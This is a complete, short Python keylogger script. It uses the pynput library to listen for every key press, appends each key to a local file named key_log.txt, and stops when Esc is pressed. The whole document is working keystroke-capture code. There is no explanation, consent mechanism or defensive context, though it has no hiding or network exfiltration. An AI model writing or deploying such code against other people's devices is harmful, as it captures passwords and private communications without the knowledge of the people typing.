from pynput import keyboard

# File where keystrokes will be logged
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(f"{key}\n")

# Function to handle each key press
def on_press(key):
    try:
        # Write the alphanumeric key
        write_to_file(key.char)
    except AttributeError:
        # Write special keys
        write_to_file(str(key))

# Function to handle when the keylogger is stopped
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setting up the listener for key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
